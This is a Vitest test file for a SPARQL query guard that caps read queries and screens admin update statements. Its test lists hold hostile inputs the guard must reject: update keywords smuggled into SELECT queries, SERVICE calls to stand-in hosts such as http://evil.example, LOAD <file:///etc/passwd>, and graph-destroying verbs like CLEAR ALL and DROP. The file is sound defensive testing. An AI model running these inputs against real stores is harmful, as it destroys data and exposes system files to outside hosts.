import { describe, expect, it } from 'vitest';
import { guardReadQuery, guardUpdateStatement, readForm, splitUpdate } from '../../src/services/query-guard';

const CAP = 100;

describe('guardReadQuery - the gate for externally authored SPARQL', () => {
  it('accepts the four read forms', () => {
    for (const query of [
      'SELECT ?s WHERE { ?s ?p ?o }',
      'ASK WHERE { ?s a <x> }',
      'CONSTRUCT { ?s ?p ?o } WHERE { ?s ?p ?o }',
      'DESCRIBE <http://x>',
    ])
      expect(guardReadQuery(query, CAP)).toContain('LIMIT');
  });

  it('accepts leading PREFIX declarations', () => {
    const out = guardReadQuery('PREFIX : <http://a#>\nPREFIX rdfs: <http://b#>\nSELECT ?s WHERE { ?s ?p ?o }', CAP);
    expect(out).toContain('PREFIX :');
    expect(out).toMatch(/LIMIT 100$/);
  });

  it('rejects anything that is not a read query', () => {
    for (const query of ['', 'DELETE WHERE { ?s ?p ?o }', 'INSERT DATA { <a> <b> <c> }', 'CLEAR ALL'])
      expect(() => guardReadQuery(query, CAP)).toThrow();
  });

  it('rejects update and remote-trip keywords smuggled into a SELECT', () => {
    const attacks = [
      'SELECT ?s WHERE { ?s ?p ?o } INSERT { ?s ?p ?o }',
      'SELECT ?s WHERE { ?s ?p ?o } DELETE DATA { <a> <b> <c> }',
      'SELECT ?s WHERE { SERVICE <http://evil.example/sparql> { ?s ?p ?o } }',
      'SELECT ?s WHERE { ?s ?p ?o } LOAD <file:///etc/passwd>',
      'SELECT ?x WHERE { ?x a ?y } USING <http://other/graph> LIMIT 5',
      'SELECT ?x WHERE { GRAPH ?g { ?x ?p ?o } } CLEAR ?g',
    ];
    for (const query of attacks) expect(() => guardReadQuery(query, CAP)).toThrow(/Forbidden SPARQL keyword/);
  });

  it('lowers a LIMIT above the ceiling instead of refusing the query', () => {
    expect(guardReadQuery('SELECT ?s WHERE { ?s ?p ?o } LIMIT 999999', CAP)).toMatch(/LIMIT 100$/);
    expect(guardReadQuery('SELECT ?s WHERE { ?s ?p ?o } LIMIT 10', CAP)).toMatch(/LIMIT 10$/);
  });

  it('adds a LIMIT only once and strips a trailing semicolon', () => {
    const out = guardReadQuery('SELECT ?s WHERE { ?s ?p ?o };', CAP);
    expect(out.match(/LIMIT/g)).toHaveLength(1);
    expect(out.startsWith('SELECT ?s WHERE { ?s ?p ?o }')).toBe(true);
  });

  it('keeps a property list semicolon while stripping a statement terminator', () => {
    const out = guardReadQuery('SELECT ?n WHERE { ?p a <Patient> ; <hasName> ?n };', CAP);
    expect(out).toContain('; <hasName> ?n }');
    expect(out.match(/LIMIT/g)).toHaveLength(1);
    expect(out).toMatch(/LIMIT 100$/);
  });

  it('is case insensitive about the keyword position', () => {
    expect(() => guardReadQuery('select ?s where { ?s ?p ?o } insert { ?a ?b ?c }', CAP)).toThrow();
    expect(guardReadQuery('  select ?s where { ?s ?p ?o }  ', CAP)).toMatch(/LIMIT 100$/);
  });
});

describe('guardUpdateStatement - the admin write hatch', () => {
  it('accepts insert, delete and delete/insert statements', () => {
    for (const update of [
      'INSERT DATA { <a> <b> <c> }',
      'DELETE WHERE { <a> <b> ?o }',
      'DELETE { ?s ?p ?o } INSERT { ?s ?p2 ?o } WHERE { ?s ?p ?o }',
      'INSERT INTO <http://g> DATA { <a> <b> <c> }',
    ])
      expect(guardUpdateStatement(update)).toBeTruthy();
  });

  it('refuses read queries and store destroying verbs', () => {
    for (const update of [
      '',
      'SELECT ?s WHERE { ?s ?p ?o }',
      'CLEAR ALL',
      'DROP SILENT <http://x>',
      'LOAD <file:///etc/passwd>',
      'ADD <a> TO <b>',
      'MOVE DEFAULT TO GRAPH <x>',
      'COPY <a> <b>',
      'CREATE GRAPH <http://x>',
      'WITH <http://other/graph> DELETE WHERE { ?s ?p ?o }',
      'INSERT DATA { <a> <b> <c> } ; DELETE { ?s ?p ?o } WHERE { SERVICE <http://evil> { ?s ?p ?o } }',
    ])
      expect(() => guardUpdateStatement(update)).toThrow();
  });
});

describe('readForm', () => {
  it('detects the tuple form behind the prefixes', () => {
    expect(readForm('PREFIX : <x>\nASK WHERE { :a :b :c }')).toBe('ask');
    expect(readForm('CONSTRUCT { ?s ?p ?o } WHERE { ?s ?p ?o }')).toBe('construct');
    expect(readForm('DESCRIBE <http://a>')).toBe('construct');
    expect(readForm('SELECT * WHERE { ?s ?p ?o }')).toBe('select');
  });

  it('defaults to select for generated queries without a recognised head', () => {
    expect(readForm('')).toBe('select');
  });
});

describe('splitUpdate', () => {
  it('separates the operations of a multi update request', () => {
    expect(splitUpdate('DELETE { ?s ?p ?o } WHERE { ?s ?p ?o }\n;\nINSERT DATA { <a> <b> <c> }')).toHaveLength(2);
  });

  it('ignores empty fragments', () => {
    expect(splitUpdate('')).toEqual([]);
    expect(splitUpdate('CLEAR DEFAULT\n;\n')).toEqual(['CLEAR DEFAULT']);
  });
});
